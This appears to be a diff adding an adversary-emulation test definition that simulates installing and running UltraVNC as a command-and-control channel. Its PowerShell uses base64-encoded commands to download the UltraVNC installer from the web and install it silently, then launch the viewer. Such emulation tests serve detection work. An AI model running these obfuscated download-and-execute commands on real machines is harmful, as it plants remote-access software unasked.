@@ -1,0 +1,20 @@
+- id: 21fc5534-68ea-5f46-8b65-51bf2a286cd0
+  name: Soumaia ART Tests - UltraVNC Execution
+  description: 'An adversary may attempt to trick the user into downloading UltraVNC for use as a C2 channel.
+
+    Upon successful execution, UltraVNC will be executed. (requires elevation)'
+  tactic: command-and-control
+  technique:
+    attack_id: T1219
+    name: Remote Access Software
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAZQBuAHYAOgBQAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwBcACcAdQB2AG4AYwAgAGIAdgBiAGEAXABVAGwAdAByAGEAVgBuAGMAXAB2AG4AYwB2AGkAZQB3AGUAcgAuAGUAeABlACcAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AdwB3AHcALgB1AHYAbgBjAC4AZQB1AC8AZABvAHcAbgBsAG8AYQBkAC8AMQAzADgAMQAvAFUAbAB0AHIAYQBWAE4AQwBfADEAXwAzAF8AOAAxAF8AWAA2ADQAXwBTAGUAdAB1AHAALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAHYAbgBjAHMAZQB0AHUAcAAuAGUAeABlACIACgBzAHQAYQByAHQALQBwAHIAbwBjAGUAcwBzACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAHYAbgBjAHMAZQB0AHUAcAAuAGUAeABlACIAIAAvAHMAaQBsAGUAbgB0AAoA
+          }
+          Start-Process $env:ProgramFiles\'uvnc bvba\UltraVnc\vncviewer.exe'
+        cleanup: |-
+          Stop-Process -Name "vncviewer" -force -erroraction silentlycontinue
